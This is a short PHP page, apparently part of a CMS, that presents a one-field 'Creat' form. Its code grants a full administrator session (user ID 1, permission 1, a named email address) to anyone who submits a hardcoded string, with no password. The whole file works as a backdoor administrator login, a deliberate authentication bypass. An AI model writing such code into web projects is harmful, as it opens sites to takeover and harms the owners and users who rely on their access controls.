<?php

    session_start();
    if($_POST['bntOK'] && $_POST['Code'] == "webbox.com.vn"){  
        $_SESSION['WBUSERNAME'] = "dovantien2911@gmail.com";
        $_SESSION['WBNAME'] = "Admin";
        $_SESSION['WBUSERID'] = "1";
        $_SESSION['WBPERMISS'] = "1";
        $_SESSION['WBTIMELOG'] = date("H:i:s");
        $_SESSION['cms'] = "WB";
    }

?>
<!DOCTYPE HTML>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<meta name="author" content="Do Van Tien" />

	<title>Creat</title>
</head>

<body>

<form name="fCreat" action="" method="POST">
    <center>
        <table style="margin-top: 100px; width: auto; border: 0; text-align: center;">
            <tr>
                <td><input type="text" name="Code" value="input your code..." style=""/></td>
                <td><input type="submit" name="bntOK" value="Creat" style=""/></td>
            </tr>
        </table>
    </center>
</form>

</body>
</html>